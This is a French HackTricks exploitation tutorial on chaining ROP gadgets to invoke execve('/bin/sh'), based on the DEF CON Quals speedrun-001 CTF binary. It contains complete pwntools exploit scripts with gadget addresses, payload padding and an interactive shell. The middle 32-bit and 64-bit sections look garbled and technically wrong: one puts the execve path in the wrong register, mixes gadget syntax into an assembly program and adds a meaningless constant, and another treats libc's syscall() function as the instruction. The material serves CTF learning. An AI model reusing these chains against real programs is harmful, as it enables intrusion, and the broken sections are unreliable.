# ROP - appel √† sys\_execve

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Afin de pr√©parer l'appel √† **syscall**, il est n√©cessaire de configurer ce qui suit :

* `rax: 59 Sp√©cifie sys_execve`
* `rdi: ptr to "/bin/sh" sp√©cifie le fichier √† ex√©cuter`
* `rsi: 0 sp√©cifie qu'aucun argument n'est pass√©`
* `rdx: 0 sp√©cifie qu'aucune variable d'environnement n'est pass√©e`

Ainsi, il est essentiel d'√©crire la cha√Æne `/bin/sh` quelque part, puis d'effectuer l'appel √† **syscall** (en prenant en compte le bourrage n√©cessaire pour contr√¥ler la pile).

## Contr√¥ler les registres

Commen√ßons par trouver **comment contr√¥ler ces registres** :
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
Avec ces adresses, il est possible d'**√©crire le contenu dans la pile et de le charger dans les registres**.

## √âcrire une cha√Æne de caract√®res

### M√©moire inscriptible

Tout d'abord, vous devez trouver un endroit inscriptible dans la m√©moire.
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### √âcrire une cha√Æne de caract√®res

Ensuite, vous devez trouver un moyen d'√©crire un contenu arbitraire √† cette adresse.
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32 bits

#### Description

Dans les architectures 32 bits, les appels syst√®me sont effectu√©s en utilisant l'instruction `int 0x80`. Cette instruction d√©clenche une interruption logicielle qui transf√®re le contr√¥le au noyau du syst√®me d'exploitation. Les arguments sont pass√©s dans les registres `eax`, `ebx`, `ecx`, `edx`, `esi` et `edi`.

#### ROP

Pour appeler une fonction du syst√®me en utilisant ROP, nous avons besoin de trouver une s√©quence de gadgets qui nous permettent de charger les arguments dans les registres appropri√©s et d'appeler l'instruction `int 0x80`. Voici un exemple de s√©quence de gadgets pour appeler la fonction `execve("/bin/sh", NULL, NULL)` :

```assembly
pop esi ; pop ebp ; ret
pop ebx ; ret
mov eax, 0xb ; ret
int 0x80
```

Cette s√©quence de gadgets effectue les op√©rations suivantes :

1. `pop esi ; pop ebp ; ret` : charge l'adresse de la cha√Æne "/bin/sh" dans `esi`.
2. `pop ebx ; ret` : charge `ebx` avec la valeur `NULL`.
3. `mov eax, 0xb ; ret` : charge `eax` avec la valeur `0xb`, qui correspond √† l'appel syst√®me `execve`.
4. `int 0x80` : d√©clenche l'interruption logicielle pour appeler la fonction du syst√®me.

#### Exemple

Voici un exemple de code qui utilise cette s√©quence de gadgets pour appeler la fonction `execve("/bin/sh", NULL, NULL)` :

```assembly
section .data
    cmd db "/bin/sh", 0

section .text
    global _start

_start:
    ; Charger l'adresse de la cha√Æne "/bin/sh" dans esi
    pop esi ; pop ebp ; ret
    add esi, 0x0a2d2a2d ; xor byte [esi], 0x2d ; ret

    ; Charger ebx avec la valeur NULL
    pop ebx ; ret
    xor ebx, ebx

    ; Charger eax avec la valeur 0xb
    mov eax, 0xb

    ; Appeler l'instruction int 0x80
    int 0x80
```

Ce code charge l'adresse de la cha√Æne "/bin/sh" dans `esi`, charge `ebx` avec la valeur `NULL`, charge `eax` avec la valeur `0xb`, puis appelle l'instruction `int 0x80` pour appeler la fonction `execve("/bin/sh", NULL, NULL)`.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 bits

#### Introduction

Dans les syst√®mes 64 bits, les appels syst√®me sont effectu√©s en utilisant l'instruction `syscall`. Cette instruction prend un num√©ro de service dans le registre `rax` et les arguments dans les registres `rdi`, `rsi`, `rdx`, `r10`, `r8` et `r9`. Les valeurs de retour sont stock√©es dans le registre `rax`.

#### ROP pour ex√©cuter `execve("/bin/sh", NULL, NULL)`

Pour ex√©cuter `/bin/sh` en utilisant `execve`, nous avons besoin de mettre l'adresse de la cha√Æne `/bin/sh` dans `rdi`, l'adresse NULL dans `rsi` et `rdx` et le num√©ro de service `execve` dans `rax`.

Nous pouvons trouver l'adresse de la cha√Æne `/bin/sh` en utilisant la commande suivante:

```bash
$ strings -a -t x /lib/libc.so.6 | grep '/bin/sh'
```

Cela nous donnera l'adresse de la cha√Æne `/bin/sh` dans la biblioth√®que `libc.so.6`.

Ensuite, nous avons besoin de trouver l'adresse de l'instruction `syscall`. Nous pouvons le faire en utilisant la commande suivante:

```bash
$ objdump -d /lib/libc.so.6 | grep syscall
```

Cela nous donnera l'adresse de l'instruction `syscall` dans la biblioth√®que `libc.so.6`.

Maintenant, nous pouvons construire notre cha√Æne ROP en utilisant les adresses que nous avons trouv√©es:

```python
#!/usr/bin/env python2

from pwn import *

libc = ELF('/lib/libc.so.6')

# Find the address of "/bin/sh"
binsh = next(libc.search('/bin/sh'))

# Find the address of the syscall instruction
syscall = libc.symbols['syscall']

# Find the address of the pop rdi; ret gadget
pop_rdi_ret = 0x00000000004006b3

# Find the address of the pop rsi; pop r15; ret gadget
pop_rsi_pop_r15_ret = 0x00000000004006b1

# Find the address of the pop rdx; ret gadget
pop_rdx_ret = 0x0000000000449935

# Build the ROP chain
rop = p64(pop_rdi_ret) + p64(binsh) + p64(pop_rsi_pop_r15_ret) + p64(0) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall)

# Send the ROP chain to the vulnerable program
p = process('./vuln')
p.sendline('A'*40 + rop)
p.interactive()
```

#### Conclusion

En utilisant ROP, nous pouvons ex√©cuter des appels syst√®me tels que `execve` pour ex√©cuter des commandes arbitraires. Cela peut √™tre utile pour obtenir un shell sur une machine cible ou pour effectuer d'autres actions malveillantes.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## Exemple
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive() 
```
## R√©f√©rences

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
